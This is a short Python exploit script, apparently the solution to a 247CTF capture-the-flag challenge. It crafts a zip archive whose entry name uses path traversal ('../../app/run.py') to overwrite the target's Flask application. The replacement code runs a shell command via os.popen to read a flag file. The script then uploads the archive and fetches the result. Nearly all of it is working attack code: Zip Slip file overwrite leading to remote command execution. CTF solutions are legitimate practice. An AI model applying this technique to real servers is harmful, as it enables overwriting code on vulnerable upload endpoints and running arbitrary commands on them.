import requests
import zipfile

url = "https://bcb25adfb47828d3.247ctf.com/"

cmd = "__import__('os').popen('cat flag_33cd0604f65815a9375e2da04e1b8610.txt').read()"

payload = f"""
from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)
app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = '/tmp/uploads/'

@app.route('/')
def source():
    return {cmd}

def zip_extract(zarchive):
    with zipfile.ZipFile(zarchive, 'r') as z:
        for i in z.infolist():
            with open(os.path.join(app.config['UPLOAD_FOLDER'], i.filename), 'wb') as f:
                f.write(z.open(i.filename, 'r').read())

@app.route('/zip_upload', methods=['POST'])
def zip_upload():
    try:
        if request.files and 'zarchive' in request.files:
            zarchive = request.files['zarchive']
            if zarchive and '.' in zarchive.filename and zarchive.filename.rsplit('.', 1)[1].lower() == 'zip' and zarchive.content_type == 'application/octet-stream':
                zpath = os.path.join(app.config['UPLOAD_FOLDER'], '%s.zip' % os.urandom(8).hex())
                zarchive.save(zpath)
                zip_extract(zpath)
                return 'Zip archive uploaded and extracted!'
        return 'Only valid zip archives are acepted!'
    except:
         return 'Error occured during the zip upload process!'

if __name__ == '__main__':
    app.run()
""".strip()

filename = 'exploit.zip'

with zipfile.ZipFile(filename, "w") as z:
    z.writestr("../../app/run.py", payload)

with open(filename, 'rb') as f:
    res = requests.post(f'{url}/zip_upload', files={
        'zarchive': (filename, f.read(), 'application/octet-stream')
    })

    if "archived" in res.text.lower():
        print("> Payload uploaded")

res = requests.get(url)
print("Flag:", res.text.strip())